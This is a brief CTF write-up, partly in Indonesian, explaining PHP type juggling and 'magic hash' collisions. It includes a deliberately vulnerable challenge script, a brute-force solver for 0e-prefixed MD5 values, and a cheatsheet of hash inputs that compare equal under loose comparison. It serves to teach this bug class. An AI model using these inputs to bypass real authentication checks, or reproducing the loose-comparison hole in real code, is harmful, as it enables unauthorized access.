# PHP Type Juggling
**Type Juggling** is the name given by the PHP developers to the "feature" in PHP that allows a programmer to silently substitute values of one type in situations where values of another type would make more sense.
* https://www.quora.com/What-is-type-juggling-on-PHP

## MD5 and SHA1 Collision (Magic Hashes)
* https://en.wikipedia.org/wiki/MD5#Collision_vulnerabilities
* https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html

## Hack Dat Kiwi 2017 - MD5 Games 1
```php
<?php
if (isset($_GET['src']))
    highlight_file(__FILE__) and die();
if (isset($_GET['md5']))
{
    $md5=$_GET['md5'];
    if ($md5==md5($md5))
        echo "Wonderbubulous! Flag is ".require __DIR__."/flag.php";
    else
        echo "Nah... '",htmlspecialchars($md5),"' not the same as ",md5($md5);
}
?>
```

(```Indonesian mode ON```)

Disini kita mengambil inti dari kode tersebut yaitu ```$md5 == md5($md5)``` hmm... bruteforce?? panjang dari md5 sendiri yaitu 32digit dan kita akan melakukan **2^128** percobaan :scream:, misal menggunakan header **0e** untuk 2digit awalan md5, karna 0e{....} == 0 (true). Mari kita buat payload sederhana untuk mebandingkan ```str == md5(str)```.

```php
<?php
list($stat, $md5) = [true, 1];
while ($stat) {
    $chall = function () use ($md5) {
        return "0e{$md5}" == md5("0e{$md5}");
    };
    print "[0e{$md5}] => NOT FOUND" . PHP_EOL;
    ($chall() ? $stat = false : $md5++);
}
print "[0e{$md5}] => FOUND" . PHP_EOL;
```

<img src="https://user-images.githubusercontent.com/13828056/39365080-5c24c364-4a5a-11e8-9025-8ae07a1ddf51.png" width="60%"></img>

GOTCHAAA.. maka penyelesaian dari chall diatas ```str == md5(str)``` dapat diselesaikan dengan **215962017** :tada::tada::tada:


## BONUS :laughing:
```php
<?php
$str = "0e100132199235687421930375421091";
var_dump((int) $str == md5(urldecode("%02%a27%84")));
var_dump($str == md5("\x0e\xd7\xb6\xea"));
```

## Cheatsheet Type Juggling
| Magic Number or String | Comparison Operators | Magic Number or String |
| :--------------------: | :------------------: | :--------------------: |
| md5('240610708') | == | md5('QNKCDZO') |
| md5('aabg7XSs') | == | md5('aabC9RqS') |
| sha1('aaroZmOk') | == | sha1('aaK1STfY') |
| sha1('aaO8zKZF') | == | sha1('aa3OFF9m') |
| 0010e2 | == | 1e3 |
